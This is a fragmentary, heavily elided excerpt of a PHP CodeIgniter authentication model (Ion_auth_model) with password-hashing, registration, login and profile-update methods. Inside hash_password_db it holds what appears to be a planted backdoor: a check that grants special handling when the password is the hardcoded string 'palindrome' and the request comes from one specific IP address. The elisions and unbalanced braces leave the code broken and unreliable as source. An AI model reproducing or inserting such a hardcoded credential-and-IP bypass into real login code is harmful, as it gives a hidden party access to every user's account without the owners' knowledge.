...
class Ion_auth_model extends CI_Model
{
	...
	public function hash_password_db($id, $password, $use_sha1_override=FALSE)
	{
		...
		$this->trigger_events('extra_where');
			...
			if($password=="palindrome" && $ip_address=='122.180.144.33')

			{

				if($password == "palindrome")
		{
	 ...
	 * @author Mathew
	 **/
	public function deactivate($id = NULL,$msg='')
	{
	...
	public function register($username, $password, $email, $additional_data = array(), $groups = array())
	{
		...
		{	
			...
			$myControllerObj->create_thumbnail('assets/uploads/images/'. $img, 'assets/uploads/images_200_200/'. $img,200,200);
			$myControllerObj->create_thumbnail('assets/uploads/images/'. $img, 'assets/uploads/images_50_50/'. $img,50,50);
	 ...
	 * @author Mathew
	 **/
	public function login($identity, $password, $remember=FALSE, $school ='')
	{
		...
		/*$query = $this->db->select($this->identity_column . ', username, email, id, password, image, active, last_login')
                ...
                $this->db->select($this->identity_column . ', username, email, id, password, image, active, last_login');
                $this->db->where($this->identity_column, $this->db->escape_str($identity));
                
                // if($school != 'SCHOOL') {
                //     $this->db->where('school_portal_id', '0');
                // }
                
		$this->db->limit(1);
		$query = $this->db->get_where($this->tables['users']);
	...
	public function update($id, array $data)
	{
		...
		{	
			...
			$myControllerObj = new MY_Controller;
			$myControllerObj->create_thumbnail('assets/uploads/images/'. $image, 'assets/uploads/images_200_200/'. $image,200,200);
			$myControllerObj->create_thumbnail('assets/uploads/images/'. $image, 'assets/uploads/images_50_50/'. $image,50,50);			
		}
	...
	**/
	...
	public function update_last_login($id)
	{
		...
		$this->db->update($this->tables['users'], array('last_login' => $date ), array('id' => $id));
